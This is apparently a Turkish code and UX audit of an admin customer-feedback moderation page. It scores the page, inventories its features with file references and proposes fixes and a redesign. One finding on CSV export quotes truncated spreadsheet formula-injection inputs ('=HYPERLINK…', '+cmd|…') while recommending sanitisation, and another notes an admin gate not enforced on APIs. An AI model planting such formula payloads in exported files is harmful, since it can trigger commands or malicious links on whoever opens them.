# /admin/feedbacks

**Amaç:** Platformdaki TÜM müşteri geri bildirimlerini (QR `Feedback` + tüketim `ConsumptionReview`) tek listede görmek, filtrelemek, incelemek, dışa aktarmak ve silmek. Platform operatörünün "Müşterinin Sesi (VOC)" moderasyon ve gözlem ekranı (`app/admin/admin-utils.ts:86` → "Geri Bildirimler & VOC").

**Genel puan:** 4.4 / 10 · **Karar:** **yeniden tasarla** (sayfa gerekli ve konumu doğru; ancak veri katmanı — birleşik sayfalama, arama, filtre semantiği — ve silme akışı kökten düzeltilmeli, ekran "liste + sil"den "VOC inceleme kuyruğu"na dönüşmeli)

İncelenen dosyalar: `app/admin/feedbacks/page.tsx` (876 satır, tamamı client), `app/admin/feedbacks/loading.tsx`, `app/admin/layout.tsx`, `app/api/admin/feedbacks/route.ts`, `app/api/admin/feedbacks/restore/route.ts`, `lib/validations-admin.ts`, `lib/export-utils.ts`, `lib/utils.ts`, `lib/analytics-sampling.ts`, `lib/api-auth.ts`, `lib/rate-limit.ts`, `proxy.ts`, `components/providers.tsx`, `components/admin/admin-premium-hero.tsx`, `prisma/schema.prisma` (Feedback, ConsumptionReview, RemedyOffer, QRCode), `lib/inngest/feedback-analyze-pipeline.ts`, `app/api/customer/consumptions/[id]/review/route.ts`, gelen linkler (`app/admin/components/SentimentSection.tsx`, `app/api/search/route.ts`, `app/api/admin/trust-timeline/route.ts`).

---

## Puan kartı

| Boyut | Puan | Gerekçe |
|---|---|---|
| İşlevsellik | 4/10 | Temel liste/filtre çalışıyor ama "Tümü" modunda 5. sayfadan sonra sayfalama bozuk, arama istemci filtresiyle çakışıyor, duygular modali indeks gösteriyor, silme hata durumunu yutup başarı bildiriyor. |
| UX | 5/10 | Tanıdık kart listesi ve filtre Sheet'i var; ancak aksiyon olarak yalnız "sil" mevcut, filtre durumu görünmez ("!" rozeti), tarih alanları etiketsiz, hata ve boş durumlar bağlamsız. |
| Görsel | 6/10 | Premium hero + istatistik kartları tutarlı; ancak 7–8 küçük kart + ayrı dağılım barı hiyerarşisiz, duygu rozeti `bg-primary` üstünde yeşil/kırmızı metinle muhtemel kontrast sorunu. |
| Mimari | 4/10 | 876 satırlık tek client bileşen, 20+ `useState`, `any` kaçakları; API iki kaynağı bellekte birleştiriyor (100+100 havuz), istatistikler her sayfa değişiminde yeniden hesaplanıyor. |
| Performans | 4/10 | Her istekte 6 ardışık round-trip / ~14 sorgu, her seferinde 5000'e kadar bayi listesi, `...f` ile `aiAnalysis` gibi büyük JSON alanları istemciye taşınıyor; her filtre değişiminde tüm liste spinner'a dönüp yeniden animasyonla giriyor. |
| Erişilebilirlik + Mobil | 4/10 | İkon-yalnız butonlarda ve checkbox'larda `aria-label` yok, yıldızların metin karşılığı yok, `text-[10px]` etiketler; mobilde satır kartı 4 sütunu yan yana sıkıştırıyor. `MotionConfig reducedMotion="user"` global olarak var (artı). |

---

## Özellik envanteri

| # | Özellik | Durum | Kanıt | Not |
|---|---|---|---|---|
| 1 | Premium hero (başlık, açıklama, ikon) | ÇALIŞIYOR | page.tsx:364-380 | Açıklama "yönetin" diyor ama yönetim aksiyonu yalnız silme. |
| 2 | "Yenile" butonu | ÇALIŞIYOR | page.tsx:369-378 | Butonda yükleniyor/disabled durumu yok. |
| 3 | Rota yükleme iskeleti | ÇALIŞIYOR | loading.tsx:3-15 | `role="status"` + `aria-busy` doğru. |
| 4 | Stat: Toplam | ÇALIŞIYOR | page.tsx:386, route.ts:284 | Filtreye duyarlı. |
| 5 | Stat: QR Yorum | ÇALIŞIYOR | page.tsx:387, route.ts:285 | |
| 6 | Stat: Tüketim Yorum | ÇALIŞIYOR | page.tsx:388, route.ts:286 | |
| 7 | Stat: Ort. Puan | ÇALIŞIYOR | page.tsx:389, route.ts:287 | |
| 8 | Stat: NPS (koşullu) | KISMİ | page.tsx:390-392, route.ts:227-237 | NPS her zaman `qrWhere` ile hesaplanır; "Tüketim" sekmesinde diğer kartlar tüketim verisini gösterirken NPS QR verisini gösterir. |
| 9 | Stat: Olumlu / Nötr / Olumsuz | KISMİ | page.tsx:393-395, route.ts:215-220, 266-271 | QR'da AI `sentiment`, tüketimde puandan türetilmiş; analiz edilmemiş (null) QR'lar "nötr" sayılır; iki farklı tanım tek sayıda toplanıyor. |
| 10 | Puan dağılımı barı (5→1) | ÇALIŞIYOR | page.tsx:417-440, route.ts:291-297 | Barlara tıklayıp filtreleme yok. |
| 11 | Serbest metin arama (400 ms debounce) | BOZUK | page.tsx:167-170, 310-317; route.ts:48-54, 110-115 | Sunucu e-postada arar, istemci e-postayı tekrar süzer → e-posta eşleşmeleri gizlenir; "işletme ara" sunucuda yok; arama sayfayı 1'e sıfırlamaz (Bulgu 2). |
| 12 | Enter ile anında arama | ÇALIŞIYOR | page.tsx:238-241, 454 | Sayfayı 1'e alır. |
| 13 | URL `?search=` senkronu | ÇALIŞIYOR | page.tsx:172-176 | Global arama buraya yönlendiriyor (`app/api/search/route.ts:94`). |
| 14 | URL `?sentiment=` deep-link | BOZUK | page.tsx:172-176 yalnız `search` okur; `app/admin/components/SentimentSection.tsx:48-100` | Panodaki "Olumlu/Nötr/Olumsuz" kartları filtresiz liste açar. |
| 15 | Tür sekmeleri (Tümü/QR/Tüketim) | ÇALIŞIYOR | page.tsx:458-464 | Sayfayı sıfırlar. |
| 16 | Duygu filtresi | KISMİ | page.tsx:469-480, route.ts:119-123 | Tüketimde puan aralığına çevrilir ve min/max puan filtresini EZER; `ConsumptionReview.sentiment` (AI) alanı yok sayılır (schema). |
| 17 | Bayi filtresi | KISMİ | page.tsx:482-493, route.ts:305-311 | Çalışıyor; ama aranamaz `Select` içinde 5000'e kadar bayi, her istekte yeniden çekiliyor, `orderBy: id` (alfabetik değil). |
| 18 | Gelişmiş Filtreler Sheet | ÇALIŞIYOR | page.tsx:495-561 | |
| 19 | Puan aralığı (min/max) | KISMİ | page.tsx:512-526 | Sayfa sıfırlanmaz; min>max doğrulaması yok; label `htmlFor` bağlı değil (510). |
| 20 | Tarih aralığı | BOZUK | page.tsx:532-533, route.ts:46-47, 108-109 | Bitiş günü dahil değil (`new Date('YYYY-MM-DD')` = UTC 00:00); iki input etiketsiz (hangisi başlangıç belli değil); sayfa sıfırlanmaz. |
| 21 | "Manuel İnceleme (<%70 AI güveni)" | KISMİ | page.tsx:536-546, route.ts:38 | Yalnız QR'a uygulanır, "Tümü"de tüm tüketim yorumları da listelenir; `intentScore` null olanlar (hiç analiz edilmemiş) hariç kalır. |
| 22 | "Uygula" butonu | KISMİ | page.tsx:548-556 | Filtreler zaten anında uygulanıyor; buton yalnız `page=1` yapar — yanıltıcı. |
| 23 | Sheet içi "Temizle" | ÇALIŞIYOR | page.tsx:557, 294-306 | |
| 24 | Aktif filtre göstergesi ("!") | KISMİ | page.tsx:500 | Kaç filtre/hangi filtre aktif belli değil; filtre çipi yok. |
| 25 | "Filtreleri Temizle" (ghost) | ÇALIŞIYOR | page.tsx:563-568 | |
| 26 | CSV dışa aktarım | KISMİ | page.tsx:319-335, export-utils.ts:42-82 | Yalnız ekrandaki ≤20 satır; CSV formül enjeksiyonu koruması yok; filigran `userId: 'admin'` sabit; tüketimde `dealerReply` hep boş. |
| 27 | PDF dışa aktarım | KISMİ | page.tsx:337-349, export-utils.ts:98-147 | Gerçekte yazdırma penceresi; popup engellenirse sessizce döner ama "PDF indirildi" toast'ı yine gösterilir. |
| 28 | Toplu aksiyon çubuğu | KISMİ | page.tsx:592-609 | Tek aksiyon: Sil. |
| 29 | Tümünü seç | KISMİ | page.tsx:278-284, 597 | Yalnız bir öğe seçiliyken görünür; yalnız mevcut sayfa. |
| 30 | Satır seçimi | KISMİ | page.tsx:286-292, 645 | Seçim sayfa/filtre değişiminde temizlenmez (Bulgu 4). |
| 31 | Toplu silme | BOZUK | page.tsx:243-276; route.ts:361-370 | `res.ok` kontrolü yok; sayfa dışı seçimler sessizce silinmez; tüketim yorumu HARD delete + ekonomi açığı (Bulgu 1, 3). |
| 32 | Silme onay dialogu | KISMİ | page.tsx:857-873 | "Geri alınamaz" metni QR için yanlış (soft delete); işlem sırasında buton kilitlenmiyor (çift tıklama). |
| 33 | Satır: avatar, ad, işletme/ürün | ÇALIŞIYOR | page.tsx:648-665 | |
| 34 | Satır: yıldız puanı | ÇALIŞIYOR | page.tsx:351-360 | Ekran okuyucu için metin yok. |
| 35 | Satır: duygu rozeti | KISMİ | page.tsx:671-674, utils.ts:308-315 | `getSentimentColor` yalnız metin rengi döner; Badge varsayılanı `bg-primary` → yeşil/kırmızı metin primary zemin üzerinde (kontrast doğrulanmadı, muhtemel sorun). |
| 36 | Satır: tür rozeti | ÇALIŞIYOR | page.tsx:675-677 | |
| 37 | Satır: "İşletme Yanıtladı" + yanıt önizleme | KISMİ | page.tsx:678-690, route.ts:152-167 | Tüketim eşlemesinde `dealerReply` yok → tüketim yorumlarında hiç gösterilmez. |
| 38 | Satır: konu etiketleri (+N) | ÇALIŞIYOR | page.tsx:691-698 | |
| 39 | Satır: göreli tarih | ÇALIŞIYOR | page.tsx:703 | Mobilde tamamen gizli (`hidden sm:block`). |
| 40 | Satır menüsü → Detay Gör | ÇALIŞIYOR | page.tsx:711-713 | |
| 41 | Satır menüsü → Sil | KISMİ | page.tsx:715-717 | Mevcut toplu seçimi sessizce `[id]` ile ezer; iptal edilirse seçim kaybolmuş kalır. |
| 42 | Liste giriş/çıkış animasyonu | KISMİ | page.tsx:627-640; providers.tsx:241 | `layout` prop'u `domAnimation` paketinde yok → etkisiz (framer dokümantasyonuna göre; çalışma zamanında doğrulanmadı). Her refetch'te stagger tekrar oynar. |
| 43 | Yükleniyor durumu (liste) | ÇALIŞIYOR | page.tsx:613-618 | Her filtre/tuşta tüm liste spinner'a döner → zıplama. |
| 44 | Boş durum | KISMİ | page.tsx:619-625 | Filtre bağlamı ve "filtreleri temizle" CTA'sı yok. |
| 45 | Hata durumu | BOZUK | page.tsx:197-211 | `res.ok` değilse (`500`, `403`) `data.success` falsy → toast yok, eski veri kalır. Yalnız ağ istisnasında toast. |
| 46 | Sayfalama | BOZUK | route.ts:62-76, 133-138, 175-182 | "Tümü" modunda her kaynaktan en fazla 100 kayıt alınıp birleşiyor; 5. sayfadan sonrası yanlış/boş (Bulgu 2). |
| 47 | Sayfa bilgisi metni | ÇALIŞIYOR | page.tsx:734-736 | |
| 48 | Detay: kullanıcı kartı | ÇALIŞIYOR | page.tsx:761-774 | "Email yok" dil karışıklığı. |
| 49 | Detay: işletme/ürün | ÇALIŞIYOR | page.tsx:777-788 | |
| 50 | Detay: puan | ÇALIŞIYOR | page.tsx:791-797 | |
| 51 | Detay: yorum metni | ÇALIŞIYOR | page.tsx:800-803 | |
| 52 | Detay: duygu analizi | KISMİ | page.tsx:808-811 | Ham İngilizce değer ("positive") gösterilir. |
| 53 | Detay: duygular (emotions) | BOZUK | route.ts:97; feedback-analyze-pipeline.ts:66 | Alan `string[]` olarak yazılıyor, API `Object.keys()` uyguluyor → "0", "1", "2" gösterilir. |
| 54 | Detay: konular | ÇALIŞIYOR | page.tsx:826-835 | |
| 55 | Detay: boyutlar (dimensions) | KISMİ | page.tsx:838-850 | İngilizce anahtar (`taste`, `service`) `capitalize` ile; iç içe obje gelirse `[object Object]`. |
| 56 | Detay: işletme yanıtı | EKSİK | page.tsx:749-854 | Listede var, detayda yok. |
| 57 | Detay: AI sinyalleri (intent, urgency, churnRisk, fraudScore, trustFlagged, isToxic, NPS, media, personel, actionSuggestions) | EKSİK | schema Feedback; route.ts:91 `...f` ile istemciye geliyor ama render edilmiyor | Veri yolda, UI yok. |
| 58 | Geri yükleme / çöp kutusu | EKSİK | restore/route.ts:13-62 | API var, UI yok; hiçbir yerden çağrılmıyor. |
| 59 | `maxFraudScore` filtresi | EKSİK | route.ts:33, 40-43 | API destekliyor, UI yok. |
| 60 | Moderasyon (gizle `isPublic`, toksik/trust işaretini onayla) | EKSİK | schema Feedback `isPublic`, `trustFlagged`, `isToxic` | Admin yalnız silebiliyor. |
| 61 | Yetki (API) | ÇALIŞIYOR | route.ts:15, 336; restore/route.ts:16 | `requireAuth(['ADMIN'])` + token replay. Gizli kapı çerezi API'de denetlenmiyor (sistem geneli, Bulgu 8). |
| 62 | Silme denetim kaydı (AuditLog) | KISMİ | route.ts:372-381 | Silinen içeriğin anlık görüntüsü yok; hard delete'te veri iz bırakmadan kaybolur. |
| 63 | Silme rate-limit | KISMİ | route.ts:339-351, rate-limit.ts:303-318 | Bellek-içi Map; serverless örnekler arası paylaşılmaz. |
| 64 | Örnekleme notu (`samplingNote`) | SAHTE | route.ts:59-64, 324 | Gerçek örnekleme yok (yalnız `take` değişiyor), not dönülüyor ama UI hiç göstermiyor. |
| 65 | Mobil yerleşim | KISMİ | page.tsx:643-720 | Checkbox + avatar + içerik + menü tek satırda; 400 px'te içerik sütunu çok dar. |

**Durum dağılımı:** ÇALIŞIYOR 28 · KISMİ 24 · BOZUK 7 · SAHTE 1 · EKSİK 5 (toplam 65)

---

## Bulgular

### 1. [KRİTİK · Veri bütünlüğü / Puan ekonomisi] Tüketim yorumu silme HARD delete — puan tekrar kazanılabilir, telafi geçmişi kaybolur
- **Kanıt:** `app/api/admin/feedbacks/route.ts:361-364` (`prisma.consumptionReview.deleteMany`), `prisma/schema.prisma` RemedyOffer `consumptionReview ... onDelete: Cascade`, `app/api/customer/consumptions/[id]/review/route.ts:152-157` (tek koruma `consumption.review` varlığı), aynı dosya 165-205 (puan kredisi).
- **Sorun:** QR yorumu soft-delete edilirken tüketim yorumu kalıcı siliniyor. (a) `consumptionId` @unique kaydı kalkınca müşteri aynı tüketim için yeniden yorum yazıp yeniden puan/XP alabilir (cap'e tabi ama "tek seferlik kredi" değişmezini bozar). (b) İlişkili `RemedyOffer` kayıtları (kabul edilmiş indirim/puan telafileri dahil) cascade ile silinir → ekonomi denetim izi kopar. (c) Karakter rozeti sayacı (`characterCategory`) geriye dönük düşer. (d) AuditLog'da yalnız `count` var, içerik yok.
- **Öneri:** `ConsumptionReview`'a `deletedAt` ekleyip iki kaynağı aynı soft-delete semantiğine getirin; tüm okuma yollarına (bayi, müşteri, rozet, CLV) `deletedAt: null` ekleyin. Tekrar yorum korumasını "kayıt var mı" yerine "bu tüketim için daha önce kredi verildi mi" (`points_credited` olayı ya da `Consumption.reviewedAt`) üzerine kurun. Silme öncesi tam satır anlık görüntüsünü AuditLog `oldData`'ya yazın. Kalıcı silme yalnız KVKK talebi akışında (`/admin/privacy-requests`) kalsın.
- **Efor:** M

### 2. [YÜKSEK · Doğruluk] "Tümü" sekmesinde sayfalama ve arama yanlış sonuç veriyor
- **Kanıt:** `route.ts:62-64` (`takeLimit = 100`), `74-75`, `136-137` (`skip: 0, take: 100`), `175-182` (bellekte birleştir + `slice`), `179` (total = iki count toplamı); `page.tsx:310-317` (istemci yeniden süzme), `route.ts:48-54` vs `110-115` (farklı arama alanları), `page.tsx:167-170` (debounce sayfayı sıfırlamıyor).
- **Sorun:** Her kaynaktan en yeni 100 satır alınıp birleştiriliyor; `total` ise gerçek sayılar. 500 QR + 50 tüketim yorumunda 28 sayfa görünür, 8. sayfadan itibaren liste boş; 6-7. sayfalar ise global sıralamayı bozar. Arama tarafında: sunucu QR'da e-postada arar, istemci sonucu `text/businessName/user.name` ile yeniden süzer → e-posta ile bulunan kayıtlar ekrandan düşer ama "Toplam N sonuç" yazısı kalır. Arama kutusu "işletme ara" der fakat sunucu işletme adında aramaz. Yazarak aramada sayfa sıfırlanmadığı için 3. sayfadayken arama boş görünür.
- **Öneri:** Birleşik akışı veritabanında üretin: iki tabloyu ortak kolonlarla `UNION ALL` eden bir Postgres VIEW (`feedback_feed`: id, source, rating, text, sentiment, createdAt, dealerId, userId, dealerReply, deletedAt…) ve Prisma `view` modeli ya da `$queryRaw`; sayfalamayı `(createdAt, id)` keyset cursor ile yapın. Arama alanlarını tek yerde tanımlayın (metin, kullanıcı adı/e-posta, işletme adı, ürün adı) ve istemci tarafı `filteredFeedbacks` süzmesini tamamen kaldırın. Arama/filtre değişiminde `page=1` (veya cursor sıfırlama) tek bir `useFilters` reducer'ından yapılsın.
- **Efor:** L

### 3. [YÜKSEK · Hata yönetimi] Silme işlemi başarısızlığı yutuyor ve sayfa dışı seçimleri sessizce bırakıyor
- **Kanıt:** `page.tsx:251-269` (`Promise.all(fetch…)` sonrası `res.ok` kontrolü yok), `page.tsx:248-249` (yalnız mevcut sayfadaki `feedbacks` içinden gruplama), `page.tsx:269` (toast `selectedIds.length` sayar), `route.ts:383` (`deleted: feedbackIds.length` — gerçek etkilenen satır değil).
- **Sorun:** 429 (rate limit), 400 veya 500 dönse bile "N geri bildirim silindi" toast'ı gösterilir. Kullanıcı 1. sayfada 5 öğe seçip 2. sayfada 3 öğe daha seçerse yalnız 3'ü silinir ama toast "8 silindi" der. Onay butonu işlem boyunca kilitlenmez.
- **Öneri:** Tek bir `POST /api/admin/feedbacks/bulk` uç noktası: `{ items: [{id, source}], action: 'delete'|'hide'|'restore' }`, `$transaction` içinde, gerçek `count` döndürsün. İstemcide seçim `Map<id, source>` olarak tutulsun (sayfa bağımsız), sonuç `res.ok` + `count` ile doğrulansın, kısmi başarı açıkça raporlansın. Onay dialogunda `pending` durumu ve "Geri al" aksiyonlu toast (soft delete → restore uç noktası zaten var).
- **Efor:** M

### 4. [YÜKSEK · Doğruluk] Detay modalinde "Duygular" indeks numarası gösteriyor
- **Kanıt:** `route.ts:97` (`Object.keys(f.emotions)`), `lib/inngest/feedback-analyze-pipeline.ts:66` ve `app/api/feedbacks/route.ts:478` (`emotions: analysis.emotions.map(e => e.label)` → `string[]`), doğru normalize örneği `app/api/feedbacks/route.ts:112-117`.
- **Sorun:** Dizi üzerinde `Object.keys` → `["0","1","2"]`. Her AI analizli QR yorumunda detayda "0 1 2" rozetleri görünür.
- **Öneri:** `lib/` altında tek bir `normalizeStringList(json)` yardımcı fonksiyonu (dizi → string filtrele; obje → anahtarlar) ve bunu admin, bayi ve müşteri API'lerinde ortak kullanın. Duygu etiketlerini TR sözlükle (`happy` → "Mutlu") gösterin.
- **Efor:** S

### 5. [ORTA · Doğruluk] Filtre semantiği tutarsız: tarih bitişi, duygu-puan çakışması, manuel inceleme, NPS
- **Kanıt:** `route.ts:47, 109` (`lte: new Date(endDate)`), `route.ts:119-123` (sentiment `cw.rating`'i üzerine yazar), `route.ts:38` (needsReview yalnız `qrWhere`), `route.ts:227-237` (NPS koşulsuz `qrWhere`), `route.ts:156` (tüketim duygusu puandan; `ConsumptionReview.sentiment` AI alanı mevcut), `page.tsx:512-533` (min/max ve tarih değişiminde `setPage(1)` yok).
- **Sorun:** Bitiş tarihi seçilen gün UTC 00:00'da kesiliyor (TR saatinde günün tamamı + 3 saat dışarıda). "Olumsuz + min puan 2" seçildiğinde tüketim tarafında min puan yok sayılıyor. "Manuel inceleme" açıkken tüm tüketim yorumları listede kalıyor. "Tüketim" sekmesindeki NPS QR verisi. Analiz edilmemiş QR'lar "Nötr" sayılıyor; bu, duygu kartlarını sistematik şişiriyor.
- **Öneri:** Filtreleri tek bir sunucu tarafı `buildFeedbackWhere(filters, source)` fonksiyonunda, Zod şemasıyla (`adminFeedbacksQuerySchema`'yı tüm alanları kapsayacak şekilde genişletin: rating 1-5, ISO tarih, sentiment enum) üretin. Bitişi `endOfDay(Europe/Istanbul)` olarak yorumlayın. Tüketimde AI `sentiment` alanını kullanın, null'ı "analiz bekliyor" ayrı kovasında gösterin. Kaynağa uygulanamayan filtre seçiliyken o kaynağı açıkça dışlayın ve UI'da "Bu filtre yalnız QR için geçerlidir" ipucu verin.
- **Efor:** M

### 6. [ORTA · Güvenlik] CSV dışa aktarımında formül enjeksiyonu (CSV injection)
- **Kanıt:** `lib/export-utils.ts:57-64` (yalnız çift tırnak kaçışı), `page.tsx:323` (kullanıcı tarafından yazılmış `text`), aynı desen `app/api/export/feedbacks/route.ts:44-52`.
- **Sorun:** Müşteri yorumu `=HYPERLINK("http://…","tıkla")` veya `+cmd|…` ile başlarsa admin dosyayı Excel'de açtığında formül olarak değerlendirilir. Tırnak içine almak Excel'de formül çalışmasını engellemez.
- **Öneri:** `exportToCSV` içinde `= + - @ \t \r` ile başlayan hücrelere `'` öneki ekleyen `sanitizeCsvCell` uygulayın (OWASP önerisi), sunucu tarafı export'ta da aynısı. Ayrıca dışa aktarımı ekrandaki 20 satırla sınırlamak yerine aktif filtrelerle sunucuda üretin (`/api/export/feedbacks` admin filtrelerini kabul etsin), filigrandaki sabit `'admin'` yerine gerçek oturum kimliğini kullanın.
- **Efor:** S

### 7. [ORTA · Performans] Her istek ~14 sorgu, 6 ardışık round-trip ve aşırı veri
- **Kanıt:** `route.ts:71-89`, `133-150`, `196-212`, `227-237`, `251-262`, `306-311` (6 ayrı `await` aşaması); `route.ts:91-92` (`...f` → `aiAnalysis`, `entities`, `themes`, `statementSentiments`, `actionSuggestions` gibi büyük JSON'lar istemciye); `route.ts:309` (`take: 5000` bayi her istekte); `page.tsx:218-229` (istatistikler sayfa değişiminde bile yeniden hesaplanır).
- **Sorun:** Neon fra1'de her round-trip gecikme ekliyor; sayfa değiştirmek bile 14 sorgu tetikliyor. Liste için gereksiz kolonlar payload'ı büyütüyor.
- **Öneri:** Uç noktayı üçe bölün: `GET /feedbacks` (yalnız liste, `select` ile dar kolonlar, cursor), `GET /feedbacks/stats` (filtre hash'ine göre Upstash Redis'te 60 sn cache, sayfa değişiminde çağrılmaz), `GET /dealers/options?q=` (arama destekli combobox, sonuç başına 20). İstatistik sorgularını tek `Promise.all` veya tek SQL (`COUNT(*) FILTER (WHERE …)`) ile toplayın. İstemcide TanStack Query (projede `QueryClientProvider` zaten var, `components/providers.tsx`) ile `keepPreviousData` kullanıp spinner yerine eski veriyi soluk göstererek yenileyin.
- **Efor:** M

### 8. [ORTA · Güvenlik / Sistem] Admin gizli kapısı API katmanında uygulanmıyor
- **Kanıt:** `proxy.ts:79-89` (gate yalnız `pathname.startsWith('/admin')`), `proxy.ts:103-117` (`/api/*` yalnız güvenlik başlıkları), `lib/api-auth.ts:52-80` (gate çerezi kontrolü yok).
- **Sorun:** Kapı tasarımının amacı "rolü kazara ADMIN yapılan kişi bile panele giremesin". Ancak böyle bir hesap `/api/admin/feedbacks` DELETE'i doğrudan çağırabilir. Sayfaya özgü değil, tüm `/api/admin/*` için geçerli; bu sayfada yıkıcı aksiyon olduğu için önemli.
- **Öneri:** `requireAuth(['ADMIN'])` içinde (veya `requireAdmin()` sarmalayıcısında) `gateCookieBelongsTo` doğrulamasını yapın; böylece tüm admin API'leri tek noktadan korunur.
- **Efor:** S

### 9. [ORTA · Bilgi mimarisi] Gelen deep-link'ler bağlamı kaybediyor
- **Kanıt:** `app/admin/components/SentimentSection.tsx:48-100` (`?sentiment=positive|neutral|negative`), `page.tsx:172-176` (yalnız `search` okunuyor), `app/api/admin/trust-timeline/route.ts:225` (belirli düşük puanlı geri bildirim için id'siz `/admin/feedbacks`).
- **Sorun:** Panodaki duygu kartına tıklayan operatör filtresiz listeye düşer; trust zaman çizelgesindeki belirli bir kayda gitmek mümkün değil.
- **Öneri:** Tüm filtre durumunu URL'de tutun (`nuqs` veya `useSearchParams` + `router.replace`): `?source=&sentiment=&dealer=&rating=1-2&from=&to=&review=1&id=`. `?id=` geldiğinde detay paneli doğrudan açılsın. Bu, paylaşılabilir görünümler ve tarayıcı geri tuşu için de gerekli.
- **Efor:** S

### 10. [ORTA · Ürün] Ekran yalnız "gör ve sil" — VOC operasyonu için aksiyon yok
- **Kanıt:** Satır menüsü `page.tsx:710-718` (Detay, Sil); toplu aksiyon `page.tsx:600-605` (Sil); kullanılmayan `restore/route.ts`; schema'daki `isPublic`, `trustFlagged`, `isToxic`, `fraudScore`, `urgency`, `churnRisk`, `dealerFirstViewedAt` alanları UI'da yok.
- **Sorun:** Platform operatörü toksik/sahte yorumu yayından kaldırma (silmeden gizleme), trust işaretini onaylama/kaldırma, AI duygusunu düzeltme (`AIFeedbackCorrection` modeli mevcut), bayiyi yanıt için dürtme, SLA ihlali görme gibi temel işlerini yapamıyor. "Sil" tek araç olduğu için yanlış kullanım ihtimali yüksek.
- **Öneri:** Aksiyon setini "Gizle/Göster (isPublic)", "Trust işaretini onayla/temizle", "AI duygusunu düzelt" (AIFeedbackCorrection'a yazar, `/admin/ai-learning` ile bağlanır), "Bayiye hatırlat", "Çöp kutusu / geri yükle" olarak genişletin; silmeyi menünün en altına, ikinci onaylı bir yıkıcı aksiyon olarak taşıyın.
- **Efor:** L

### 11. [DÜŞÜK · Erişilebilirlik] İkon butonları, checkbox'lar ve yıldızlar etiketsiz
- **Kanıt:** `page.tsx:706-708` (MoreVertical), `738-744` (sayfalama okları), `597`, `645` (Checkbox), `351-360` (yıldızlar), `510`, `530` (`<label>` `htmlFor`'suz), `532-533` (etiketsiz tarih inputları), `406` (`text-[10px]`).
- **Öneri:** `aria-label="Satır işlemleri: {kullanıcı}"`, `aria-label="Önceki sayfa"`, checkbox'lara `aria-label="{kullanıcı} geri bildirimini seç"`; yıldız grubuna `role="img" aria-label="5 üzerinden 4 puan"`; tarih alanlarına görünür "Başlangıç/Bitiş" etiketleri; stat etiketlerini en az 12 px yapın. Liste için `role="feed"` veya tablo semantiği.
- **Efor:** S

### 12. [DÜŞÜK · Dil / Tip güvenliği / Ölü kod] Karışık dil, `any` kaçakları, kullanılmayan importlar
- **Kanıt:** `page.tsx:810` (ham "positive"), `768` ("Email yok"), `844` (İngilizce boyut anahtarları); `page.tsx:105` (`dimensions?: any`), `678, 685, 688` (`(feedback as any).dealerReply`), `route.ts:37, 67, 105, 128, 152` (`any`); kullanılmayan `CheckSquare`, `Square`, `Calendar`, `User` (page.tsx:24-29); `route.ts:17` kullanılmayan `session`; `useAppT` yalnız tek metin için (page.tsx:616), geri kalan her şey sabit TR (sidebar ise i18n anahtarı kullanıyor: `components/dashboard/sidebar.tsx:165`).
- **Öneri:** API yanıtı için paylaşılan `FeedbackListItem` tipi (Zod ile çıkarılmış) ve `dealerReply` alanını tipe ekleyin; tüm metinleri `useAppT` anahtarlarına taşıyın; duygu/duygular/boyutlar için TR etiket sözlükleri.
- **Efor:** S

### 13. [DÜŞÜK · Motion] `layout` animasyonu etkisiz, liste her refetch'te yeniden "giriş" yapıyor
- **Kanıt:** `page.tsx:627-640` (`layout`, `AnimatePresence mode="popLayout"`), `components/providers.tsx:241` (`LazyMotion features={domAnimation}` — layout özelliği `domMax`'ta), `page.tsx:613` (loading'de liste tamamen unmount).
- **Sorun:** Silme sonrası yerleşim kayması animasyonu çalışmaz; her filtre değişiminde 20 kart sıfırdan stagger ile girer — veri aracı için gereksiz hareket. (Çalışma zamanında doğrulanmadı; framer-motion paket tanımına dayanıyor.)
- **Öneri:** Liste için yalnız silme/gizleme anında çıkış (opacity + height collapse) ve yeni gelen kayıtlar için tek seferlik "yeni" vurgusu yeterli; yenilemede eski veriyi soluk tutup animasyonsuz değiştirin. `layout` gerekiyorsa yalnız bu sayfa için `LazyMotion features={domMax}` yerel sarmalayıcı.
- **Efor:** S

### 14. [DÜŞÜK · Dürüstlük] "Örnekleme" notu üretiliyor ama gerçek örnekleme yok ve UI göstermiyor
- **Kanıt:** `route.ts:59-64` (yalnız `takeLimit` değişir), `route.ts:324` (`samplingNote` dönülür), `page.tsx` içinde `samplingNote` geçmiyor; `lib/analytics-sampling.ts:16-26`.
- **Öneri:** Ya kaldırın ya da istatistikler gerçekten örneklenecekse (ör. `TABLESAMPLE`) UI'da "Yaklaşık" etiketiyle gösterin. Mevcut haliyle ölü/yanıltıcı kod.
- **Efor:** S

---

## Eksik özellikler (kıyas ürünlerle)

1. **İnceleme kuyruğu / durum iş akışı** (Linear triage, Zendesk): her geri bildirime `new → in_review → resolved / escalated` durumu, atanan operatör, SLA sayacı (Inngest'te `negative-feedback-sla` fonksiyonu zaten var, `app/api/internal/inngest/negative-feedback-sla/route.ts`), "bana atanmış" görünümü.
2. **Kaydedilmiş görünümler + URL'de filtre durumu** (Linear/Stripe): "Son 24 saat 1-2 yıldız", "Trust işaretli", "Yanıtsız 48 saat+" gibi hazır ve kaydedilebilir görünümler, paylaşılabilir link.
3. **Ayrıntı yan paneli (drawer) ve klavye gezintisi** (Linear `j/k`, Stripe): listeden ayrılmadan sağda detay, AI sinyalleri, bayi yanıt geçmişi, müşterinin önceki yorumları (`/api/customer/feedbacks/[id]/journey` benzeri), telafi teklifleri.
4. **Moderasyon araçları:** gizle/göster, trust/fraud işaretini onayla, AI düzeltmesi, çöp kutusu + geri yükleme, toplu işlemler (durum, etiket, gizle).
5. **Trend ve tema analitiği** (PostHog/Qualtrics): zaman serisi (günlük hacim + ortalama puan), tema/konu kümeleri ve değişimleri, bayi bazlı sıralama; puan dağılımı barına tıklayarak filtre.
6. **Sunucu tarafı, filtre-duyarlı, asenkron dışa aktarım:** tüm sonuç kümesi için CSV/XLSX, e-posta ile hazır link, audit kaydı.

---

## Yeniden tasarım vizyonu

**Hedef deneyim:** "Platformun müşteri sesi gelen kutusu." Operatör sayfayı açtığında önce *dikkat gerektirenleri* görür (düşük puan + yanıtsız, trust/fraud işaretli, toksik, AI güveni düşük), tek tıkla bir kayda girer, sağ panelde bağlamı okur ve gizle / işaretle / bayiye hatırlat / düzelt aksiyonlarından birini klavyeyle uygular. Analitik ikinci planda, filtrelerle senkron bir şerittir.

**Yerleşim (masaüstü):**
- Üstte ince başlık satırı (mevcut büyük hero yerine kompakt sürüm) + kaydedilmiş görünüm sekmeleri: *Dikkat gerektiren · Tümü · Yanıtsız · İşaretli · Çöp kutusu*.
